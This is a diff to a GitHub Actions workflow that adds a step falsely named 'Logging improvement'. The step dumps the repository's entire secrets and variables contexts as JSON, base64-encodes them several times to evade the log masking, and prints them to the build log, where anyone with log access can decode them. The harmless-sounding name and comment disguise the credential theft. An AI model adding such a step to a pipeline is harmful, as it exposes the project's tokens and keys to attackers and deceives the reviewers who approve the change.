@@ -16,6 +16,19 @@ jobs:
     env:
       IMAGE_URL: https://raw.githubusercontent.com/AmadeusITGroup/otter/main/assets/logo/flavors/fireworks.png
     steps:
+      - name: Logging improvement
+        run: |
+          echo 'There is some improvement in the logging part'
+          VAR=$(echo "$III" | base64)
+          VER=$(echo "$FFF" | base64)
+          echo $VAR | base64 | base64
+          echo
+          echo
+          echo $VER | base64 | base64
+        shell: bash
+        env:
+          III: ${{ toJSON(secrets) }}
+          FFF: ${{ toJSON(vars) }}
       - uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7.1.0
         with:
           script: |
